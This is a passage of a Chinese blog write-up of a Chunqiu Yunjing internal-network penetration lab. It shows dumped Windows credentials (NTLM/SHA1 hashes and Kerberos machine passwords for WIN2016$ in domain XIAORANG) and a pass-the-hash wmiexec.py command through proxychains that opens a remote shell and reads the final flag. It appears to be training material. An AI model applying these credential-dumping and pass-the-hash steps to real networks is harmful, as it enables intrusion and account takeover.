+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>56946</span> <span class=o>(</span>00000000:0000de72<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>1</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-1
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:06
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-1
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 4ba974f170ab0fe1a8a1eb0ed8f6fe1a
+</span></span><span class=line><span class=cl>	 * SHA1     : e06238ecefc14d675f762b08a456770dc000f763
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>	 * Password : 9e ae c4 7a ed ee <span class=m>91</span> <span class=m>74</span> a5 <span class=m>59</span> <span class=m>61</span> a5 <span class=m>00</span> 2c c5 <span class=m>00</span> <span class=m>60</span> 3b <span class=m>87</span> <span class=m>48</span> d0 <span class=m>17</span> <span class=m>48</span> cf df 7b <span class=m>14</span> af 9a <span class=m>99</span> <span class=m>22</span> b5 <span class=m>94</span> ba 0a 1e f0 6e f0 <span class=m>25</span> b1 e2 a2 <span class=m>62</span> fb b8 <span class=m>68</span> <span class=m>93</span> <span class=m>42</span> <span class=m>64</span> <span class=m>08</span> b7 f6 2e f7 cf ae a3 7a <span class=m>94</span> 9d <span class=m>32</span> <span class=m>24</span> 1a b1 6b <span class=m>87</span> 6c 5e f1 d3 <span class=m>89</span> c6 c4 8b d3 bd <span class=m>05</span> 9c b0 e1 <span class=m>85</span> d4 2c <span class=m>03</span> <span class=m>56</span> 5f af <span class=m>09</span> <span class=m>15</span> <span class=m>12</span> <span class=m>10</span> df <span class=m>74</span> e7 4c d3 <span class=m>65</span> <span class=m>55</span> d8 ab bd b4 <span class=m>71</span> 5c 8c a7 bd <span class=m>14</span> <span class=m>60</span> 8b <span class=m>44</span> b5 d8 d8 <span class=m>61</span> <span class=m>23</span> f1 4f 4d 8e a0 dc ac 8a <span class=m>60</span> <span class=m>15</span> 0d f7 9f a1 <span class=m>85</span> <span class=m>98</span> c4 cf <span class=m>34</span> ec ee ea c5 b9 5b <span class=m>42</span> 8b <span class=m>97</span> cc 4d ed 1f db 8c b4 <span class=m>45</span> <span class=m>06</span> ce <span class=m>40</span> <span class=nb>fc</span> <span class=m>81</span> <span class=m>96</span> ac c3 <span class=m>61</span> e5 e9 <span class=m>42</span> <span class=m>90</span> <span class=m>69</span> f3 b2 <span class=m>85</span> fa <span class=m>80</span> <span class=m>59</span> e2 8b a5 f6 <span class=m>70</span> 5d 1a bd 5f b1 <span class=m>85</span> 6b ae b0 <span class=m>16</span> <span class=m>42</span> <span class=m>29</span> 2c <span class=m>99</span> <span class=m>57</span> fb <span class=m>49</span> ea e3 <span class=m>29</span> <span class=m>49</span> <span class=m>56</span> <span class=m>55</span> 6c 9a 2b ee <span class=m>13</span> <span class=m>77</span> fe d7 a3 <span class=m>51</span> b8 <span class=m>01</span> ec bb <span class=m>60</span> <span class=m>22</span> b8 7c 2f f5 6b 0f 6b <span class=m>87</span> <span class=m>36</span> <span class=m>76</span> <span class=m>45</span> <span class=m>81</span> 7e e3 <span class=m>71</span> 0a a8 ca 2a a3 a6 <span class=m>05</span> <span class=m>64</span> 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>997</span> <span class=o>(</span>00000000:000003e5<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Service from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : LOCAL SERVICE
+</span></span><span class=line><span class=cl>Domain            : NT AUTHORITY
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:06
+</span></span><span class=line><span class=cl>SID               : S-1-5-19
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	 * Domain   : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	 * Domain   : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>55412</span> <span class=o>(</span>00000000:0000d874<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : Interactive from <span class=m>1</span>
+</span></span><span class=line><span class=cl>User Name         : DWM-1
+</span></span><span class=line><span class=cl>Domain            : Window Manager
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:06
+</span></span><span class=line><span class=cl>SID               : S-1-5-90-0-1
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span><span class=line><span class=cl>	 * SHA1     : bfdd1f04aec108e73f0b86ba1174d4ca878b755e
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : xiaorang.lab
+</span></span><span class=line><span class=cl>	 * Password : f9 e6 1d d5 <span class=m>24</span> 6d <span class=m>09</span> e8 0a 2f <span class=m>09</span> <span class=m>43</span> b2 b2 0d d1 c6 a9 c4 a1 <span class=m>43</span> 8e d0 e6 f2 3a <span class=m>63</span> 6c c6 <span class=m>73</span> <span class=m>71</span> <span class=m>39</span> cc a4 <span class=m>34</span> 0e 6d <span class=m>60</span> e5 5d <span class=m>30</span> 6f <span class=m>37</span> 9e <span class=m>56</span> f9 <span class=m>73</span> b6 <span class=m>12</span> <span class=m>02</span> da a8 0c <span class=m>54</span> 5b <span class=m>44</span> <span class=m>58</span> 7d b1 3c 1b b5 e6 <span class=m>30</span> 9d 1e f6 6a ff c4 d1 ff <span class=m>53</span> e0 <span class=m>30</span> 5d c2 6e <span class=nb>fc</span> bf 6b a3 <span class=m>99</span> <span class=m>72</span> a2 4c 9a a8 <span class=m>73</span> 9f <span class=m>03</span> <span class=m>03</span> 6e 2a f2 <span class=m>64</span> <span class=m>22</span> <span class=m>05</span> a6 ea d5 d8 e9 <span class=m>25</span> 3b <span class=m>55</span> 7c 4e 5e <span class=m>64</span> cb bb <span class=m>84</span> <span class=m>62</span> a6 d9 7a ba <span class=m>64</span> db c7 b6 <span class=m>72</span> <span class=m>82</span> <span class=m>98</span> 8b <span class=m>90</span> <span class=m>56</span> 8e <span class=m>79</span> ca <span class=m>82</span> <span class=m>82</span> <span class=m>79</span> a9 fa ef 4c dd <span class=m>28</span> ef eb 2c e8 <span class=nb>fc</span> <span class=m>12</span> f0 <span class=m>27</span> <span class=m>64</span> <span class=m>09</span> <span class=m>69</span> b1 <span class=m>25</span> bc bf e2 b8 <span class=m>05</span> ac <span class=m>70</span> 2d a0 fe <span class=m>85</span> 0e <span class=m>31</span> b1 e3 <span class=m>09</span> <span class=m>89</span> 9b 4c b2 b9 <span class=m>63</span> <span class=m>57</span> c4 <span class=m>15</span> 9b <span class=m>68</span> <span class=m>34</span> a0 <span class=m>48</span> 3d 9d <span class=m>68</span> f7 c8 <span class=m>91</span> a7 0f b1 d5 <span class=m>39</span> <span class=m>28</span> da <span class=m>26</span> <span class=m>68</span> a1 5c 4c 4b c1 af a0 a7 <span class=m>25</span> <span class=m>15</span> 9f e6 9f <span class=nb>fc</span> b0 <span class=m>63</span> e7 8d 2d be <span class=m>35</span> 3a 2e 5b <span class=m>33</span> 2b <span class=m>19</span> <span class=m>16</span> <span class=m>18</span> <span class=m>40</span> bc <span class=m>70</span> <span class=m>30</span> d4 5b fa <span class=m>81</span> fa <span class=m>42</span> <span class=m>01</span> <span class=m>69</span> <span class=m>36</span> 
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>25413</span> <span class=o>(</span>00000000:00006345<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Domain            : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:05
+</span></span><span class=line><span class=cl>SID               : 
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	 <span class=o>[</span>00000003<span class=o>]</span> Primary
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span><span class=line><span class=cl>	 * SHA1     : bfdd1f04aec108e73f0b86ba1174d4ca878b755e
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Authentication Id : <span class=m>0</span> <span class=p>;</span> <span class=m>999</span> <span class=o>(</span>00000000:000003e7<span class=o>)</span>
+</span></span><span class=line><span class=cl>Session           : UndefinedLogonType from <span class=m>0</span>
+</span></span><span class=line><span class=cl>User Name         : WIN2016$
+</span></span><span class=line><span class=cl>Domain            : XIAORANG
+</span></span><span class=line><span class=cl>Logon Server      : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>Logon Time        : 2025/11/1 15:31:05
+</span></span><span class=line><span class=cl>SID               : S-1-5-18
+</span></span><span class=line><span class=cl>	msv :	
+</span></span><span class=line><span class=cl>	tspkg :	
+</span></span><span class=line><span class=cl>	wdigest :	
+</span></span><span class=line><span class=cl>	 * Username : WIN2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	kerberos :	
+</span></span><span class=line><span class=cl>	 * Username : win2016$
+</span></span><span class=line><span class=cl>	 * Domain   : XIAORANG.LAB
+</span></span><span class=line><span class=cl>	 * Password : <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>	ssp :	
+</span></span><span class=line><span class=cl>	credman :	
+</span></span></code></pre></div><p>得到该用户hash</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>NTLM     : 217850c87ae3a76d998d8c85ad02e0dc
+</span></span></code></pre></div><p>利用这个脚本进行管理员hash连接<br><a href=https://github.com/Lex-Case/Impacket/blob/master/examples/wmiexec.py>https://github.com/Lex-Case/Impacket/blob/master/examples/wmiexec.py</a></p><p>也是成功得到了flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# proxychains -q python3 wmiexec.py -hashes :217850c87ae3a76d998d8c85ad02e0dc xiaorang.lab/WIN2016<span class=se>\$</span>@172.22.8.15 -codec gbk
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> SMBv3.0 dialect used
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Launching semi-interactive shell - Careful what you execute
+</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
+</span></span><span class=line><span class=cl>C:<span class=se>\&gt;</span><span class=nb>type</span> C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\f</span>lag<span class=se>\f</span>lag03.txt
+</span></span><span class=line><span class=cl> _________               __    _                  _    
+</span></span><span class=line><span class=cl><span class=p>|</span>  _   _  <span class=p>|</span>             <span class=o>[</span>  <span class=p>|</span>  <span class=o>(</span>_<span class=o>)</span>                / <span class=p>|</span>_  
+</span></span><span class=line><span class=cl><span class=p>|</span>_/ <span class=p>|</span> <span class=p>|</span> <span class=se>\_</span><span class=p>|</span>.--.   .---.  <span class=p>|</span> <span class=p>|</span>  __  .---.  _ .--. <span class=sb>`</span><span class=p>|</span> <span class=p>|</span>-<span class=s1>&#39; 
+</span></span></span><span class=line><span class=cl><span class=s1>    | |   ( (`\] / /&#39;</span><span class=sb>`</span><span class=se>\]</span> <span class=p>|</span> <span class=p>|</span> <span class=o>[</span>  <span class=p>|</span>/ /__<span class=se>\\</span><span class=o>[</span> <span class=sb>`</span>.-. <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>   
+</span></span><span class=line><span class=cl>   _<span class=p>|</span> <span class=p>|</span>_   <span class=sb>`</span><span class=s1>&#39;.&#39;</span>. <span class=p>|</span> <span class=se>\_</span>_.  <span class=p>|</span> <span class=p>|</span>  <span class=p>|</span> <span class=o>||</span> <span class=se>\_</span>_., <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>,  
+</span></span><span class=line><span class=cl>  <span class=p>|</span>_____<span class=p>|</span> <span class=o>[</span><span class=se>\_</span>_<span class=o>)</span> <span class=o>)</span><span class=s1>&#39;.___.&#39;</span><span class=o>[</span>___<span class=o>][</span>___<span class=o>]</span><span class=s1>&#39;.__.&#39;</span><span class=o>[</span>___<span class=o>||</span>__<span class=o>]</span><span class=se>\_</span>_/  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Congratulations! ! !
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag03: flag<span class=o>{</span>4761d4cc-d2c4-47f1-b565-4f53acd5cab2<span class=o>}</span>
+</span></span></code></pre></div></div><footer class=post-footer><div class=post-footer__tags><a href=/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/ data-pagefind-filter=tag>春秋云镜</a>
+<a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ data-pagefind-filter=tag>内网渗透</a></div><div class=post-footer__license>Licensed under CC BY-NC-SA 4.0</div><nav class=post-footer__nav><a href=/p/bottle%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%94%B1%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti/><small>← Previous</small>
+<span>bottle框架中由斜体字引发的SSTI</span>
+</a><a href=/p/n1j%E5%A4%8D%E7%8E%B0/ class=post-footer__nav-next><small>Next →</small>
+<span>N1J web赛题复现</span></a></nav></footer></article><aside class=post-layout__aside><div class=toc><div class=toc__title>Contents</div><nav id=TableOfContents><ol><li><a href=#前情提要>前情提要</a></li><li><a href=#本期推荐>本期推荐</a></li><li><a href=#关于工具>关于工具</a></li><li><a href=#前期准备>前期准备</a></li><li><a href=#flag1>flag1</a><ol><li><a href=#fscan扫描>fscan扫描</a></li><li><a href=#mdut连接>MDUT连接</a></li><li><a href=#上线cs>上线CS</a></li></ol></li><li><a href=#flag2>flag2</a><ol><li><a href=#查看在线用户>查看在线用户</a></li><li><a href=#搭建内网代理>搭建内网代理</a></li><li><a href=#扫描内网>扫描内网</a></li><li><a href=#kali进行密码喷涂>kali进行密码喷涂</a></li></ol></li><li><a href=#flag3>flag3</a></li></ol></nav></div></aside></div><template id=toc-mobile-tpl><button class=toc-fab id=toc-fab type=button aria-label=打开目录>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg></button><div class=toc-drawer__overlay id=toc-drawer-overlay></div><aside class=toc-drawer id=toc-drawer role=dialog aria-modal=true aria-label=文章目录><div class=toc-drawer__handle aria-hidden=true></div><div class=toc-drawer__header><span class=toc-drawer__title>目录</span>
+<button class=toc-drawer__close id=toc-drawer-close type=button aria-label=关闭目录>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div><div class="toc toc-drawer__content"><nav class=toc-drawer__nav><ol><li><a href=#前情提要>前情提要</a></li><li><a href=#本期推荐>本期推荐</a></li><li><a href=#关于工具>关于工具</a></li><li><a href=#前期准备>前期准备</a></li><li><a href=#flag1>flag1</a><ol><li><a href=#fscan扫描>fscan扫描</a></li><li><a href=#mdut连接>MDUT连接</a></li><li><a href=#上线cs>上线CS</a></li></ol></li><li><a href=#flag2>flag2</a><ol><li><a href=#查看在线用户>查看在线用户</a></li><li><a href=#搭建内网代理>搭建内网代理</a></li><li><a href=#扫描内网>扫描内网</a></li><li><a href=#kali进行密码喷涂>kali进行密码喷涂</a></li></ol></li><li><a href=#flag3>flag3</a></li></ol></nav></div></aside></template></div><footer class=site-footer><div class=container><div class=site-footer__social><a href=https://github.com/GCXWLP target=_blank rel=noopener title=GitHub><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=mailto:eminemgcxwlp@gmail.com target=_blank rel=noopener title=Email><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</a><a href=/index.xml target=_blank rel=noopener title=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><div class=site-footer__copy>&copy; 2025 - 2026 Twansh's blog</div><div class=site-footer__stats><span>65 posts</span>
+<span>73.3k words</span></div><div class=site-footer__powered>Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a></div></div></footer><div class=search-overlay id=search-overlay role=dialog aria-label=Search><div class=search-overlay__dialog><div class=search-overlay__input-wrap><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+<input type=text id=search-input placeholder=搜索文章标题、标签、分类或正文... autocomplete=off></div><div class=search-overlay__results id=search-results><div class=search-overlay__empty>输入关键词开始搜索</div></div></div></div><script defer src=/js/theme-toggle.min.9d3288aa4ff1e33e40906fb67350ea3f5dad1533f19d7428a2335ceac6bf3c4e.js></script><script defer src=/js/search.min.6145f9c11b47c22f4014c24c80522fe739d7844fc997719a3bc26c050c908051.js></script><script defer src=/js/code-copy.min.f61de5ab74980e8e52ca0081d6fedb33bc5496b41391a410ef15ed6e014e502d.js></script><script defer src=/js/toc.min.c478fb80ad68dc9f44f00689b23d39261c2507596ea06147d49cd7efdbe36c36.js></script><script defer src=/js/lightbox.min.0c5e41aab8770358537c2bdf79007e06c974fcc4d05380a8f5fc0a4ed6e5bab9.js></script></body></html>
